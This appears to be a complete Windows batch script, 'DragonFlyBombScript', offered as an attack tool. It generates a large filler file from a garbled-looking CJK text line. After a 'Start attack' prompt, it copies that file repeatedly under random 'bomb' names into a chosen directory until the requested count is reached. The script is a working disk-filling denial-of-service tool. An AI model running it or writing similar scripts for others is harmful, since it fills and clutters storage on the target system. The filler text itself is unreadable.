@echo off && call :setESC && setlocal enabledelayedexpansion && title drbscript.cmd - [DragonFlyBombScript.cmd]
set showname=0
set LogFileCount=0
set count=%2
set size=%3
set fatFile=%random%Fat.txt
set loghidden=1
if "%1"=="--help" goto help
if "%1"=="-h" goto help
if "%1"=="--start" goto main 
echo usage: drbscript.cmd [--help] [--start] (count of file) (size-files) (dir [--local for local dir]) [attr: --showname or --loghidden] && goto end
:help 
echo. && goto end
:main
echo. && for /l %%i in (1,1,55) do ( ping -n 1 localhost >nul)
if "%2"=="" ( echo Error: you dont set the attr && goto end )
if "%3"=="" ( echo Error: you dont set the attr && goto end )
if "%4"=="" ( echo Error: you dont set the dir && goto end )
if "%4"=="--local" ( echo %ESC%[36m drbscript.cmd%ESC%[0m  Logs: Set dir the local ) else ( cd /D %4 >nul )
if "%5"=="--loghidden" ( set "loghidden=0" && echo %ESC%[36m drbscript.cmd%ESC%[0m  Logs: Logs is hidden )
if "%5"=="--showname" ( set "showname=1" && echo %ESC%[36m drbscript.cmd%ESC%[0m  Logs: File name is show ) else ( echo %ESC%[36m drbscript.cmd%ESC%[0m  Logs: File name is hidden )
echo %ESC%[36m drbscript.cmd%ESC%[0m  Logs: current path the %cd% && for /l %%i in (1,1,55) do ( ping -n 1 localhost >nul)
echo %ESC%[36m drbscript.cmd%ESC%[0m  Logs: Genereting Fat.txt .. && for /l %%i in (1,1,55) do ( ping -n 1 localhost >nul)
for /l %%i in (1,1,!size!) do ( call :fatGen )
echo %ESC%[36m drbscript.cmd%ESC%[0m  Logs: Genereting complite... && for /l %%i in (1,1,55) do ( ping -n 1 localhost >nul)
:start
set /p root="%ESC%[36m drbscript.cmd%ESC%[0m  Start attack at %cd% (y/n)? "
if "%root%"=="y" ( goto createBombFile )
if "%root%"=="n" ( echo. && goto end )  
goto start
:createBombFile
set /a LogFileCount+=1
set file=bomb%random%r%random%a%random%u%random%o%random%r%random%s%random%t%random%o%random%k%random%e%random%n%random%s%random%tm%random%bomb!LogFileCount!.txt
if "%loghidden%"=="1" ( if "%showname%"=="1" ( echo %ESC%[36m drbscript.cmd%ESC%[0m  %ESC%[36m]%ESC%[0m Logs: Creating count of file: %ESC%[31m !LogFileCount! %ESC%[0m  File name: %file% ) else ( echo %ESC%[36m drbscript.cmd%ESC%[0m  Logs: Creating count of file: %ESC%[31m !LogFileCount! %ESC%[0m ) )
copy /Y %fatFile% %file% >nul
if "!LogFileCount!"=="!count!" ( goto attackfinish )
goto createBombFile
goto end 
:attackfinish
ping -n 2 localhost >nul && echo. && echo %ESC%[36m[%ESC%[0m drbscript.cmd %ESC%[36m]%ESC%[0m Logs: %ESC%[36m[%ESC%[0m %ESC%[32m attack is complite %ESC%[0m %ESC%[36m]%ESC%[0m 
if "%loghidden%"=="0" ( echo. && echo %ESC%[36m[%ESC%[0m drbscript.cmd %ESC%[36m]%ESC%[0m Logs: [count creating file: %ESC%[31m !LogFileCount! %ESC%[0m ])
goto end
:fatGen
echo 䀠䵥物癢䕗婳杘睃歏䝨䡪慂捒琹然ਢ┊쎧杦㪹㕾ⰲ┱ꜥ曃륧縺㘳ㄬ┥쎧杦㪹㉾ⰰ┱ꜥ曃륧縺〲ㄬ┥旃썩䵫▜ꜥ曃륧縺㐱ㄬ┥쎧杦㪹㍾ⰴ┱ꜥ曃륧縺㤴ㄬ┥斥梹꾧◃ꜥ曃륧縺㐱ㄬ┥쎧杦㪹㍾ⰹ┱ꜥ曃륧縺〲ㄬ┥쎧杦㪹㝾ㄬഥ䀦汣♳獀瑥∠쎧杦㶹由智匲摔䙄硙䤴㕯㍖䬸䩬乐浌湁㝑べ啰䀠䵥物癢䕗婳杘睃歏䝨䡪慂捒琹然ਢ┊쎧杦㪹㕾ⰲ┱ꜥ曃륧縺㘳ㄬ┥쎧杦㪹㉾ⰰ┱ꜥ曃륧縺〲ㄬ┥旃썩䵫▜ꜥ曃륧縺㐱ㄬ┥쎧杦㪹㍾ⰴ┱ꜥ曃륧縺㤴ㄬ┥斥梹꾧◃ꜥ曃륧縺㐱ㄬ┥쎧杦㪹㍾ⰹ┱ꜥ曃륧縺〲ㄬ┥쎧杦㪹㝾ㄬഥ   >>%fatFile%
:setESC
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do ( 
    set ESC=%%b
)
:end